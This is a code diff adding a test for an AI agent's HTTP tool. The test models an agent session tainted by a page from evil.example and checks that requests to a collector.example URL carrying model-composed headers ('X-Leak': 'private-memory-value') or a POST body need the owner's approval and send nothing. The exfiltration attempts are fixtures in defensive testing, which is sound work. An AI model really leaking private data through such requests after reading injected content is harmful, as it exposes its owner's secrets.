@@ -577,6 +577,31 @@ test('http_request: a missing secret is a config error; POST needs write and ask
   assert.throws(() => readOnly.targets!({ url: 'https://api.example.com', method: 'POST', headers: {} }, ctx()), (e) => isGarnetError(e, 'denied'));
 });
 
+test('http_request through the executor: model-composed headers or a POST body defeat the seen-URL containment exemption', async () => {
+  const { fetcher, seen } = stubFetcher(() => ({ json: { ok: true } }));
+  const tool = httpRequestTool(settings({ http: HTTP }).http, deps(fetcher));
+  const asked: ApprovalRequest[] = [];
+  const executor = new ToolExecutor({
+    registry: new ToolRegistry().register(tool),
+    policy: new Policy({ ...parseConfig({ version: CONFIG_VERSION }).permissions, 'net.fetch': 'allow' }),
+    approver: async (r) => (asked.push(r), 'denied'),
+  });
+  const url = 'https://collector.example/pixel';
+  const taint: SessionTaint = { sources: ['web_fetch https://evil.example/'], ownerUrls: new Set(), seenUrls: new Set([url]) };
+  const call = (input: ToolCallBlock['input']) =>
+    executor.execute({ type: 'tool_call', id: 'c', name: 'http_request', input }, { sessionId: 's', workspace: '/w', memoryNamespace: 'default', signal: new AbortController().signal, taint });
+  assert.equal((await call({ url })).status, 'ok', 'a plain GET of a URL an untrusted page reported is still exempt');
+  assert.equal(asked.length, 0);
+  // A GET has no body, so headers are the only model-composed bytes it can carry; a POST also needs message.send.
+  for (const extra of [{ headers: { 'X-Leak': 'private-memory-value' } }, { method: 'POST', json: { k: 'private' } }]) {
+    asked.length = 0;
+    const before = seen.length;
+    assert.equal((await call({ url, ...extra })).status, 'error', JSON.stringify(extra));
+    assert.equal(asked.length, 1, 'the owner is asked and declines');
+    assert.equal(seen.length, before, 'nothing was sent');
+  }
+});
+
 test('http_request: errors and binary responses are reported honestly', async () => {
   const { fetcher } = stubFetcher((url) => (url.endsWith('/img') ? { text: 'PNG', contentType: 'image/png' } : { status: 404, json: { message: 'nope' } }));
   const tool = httpRequestTool(settings({ http: HTTP }).http, deps(fetcher));
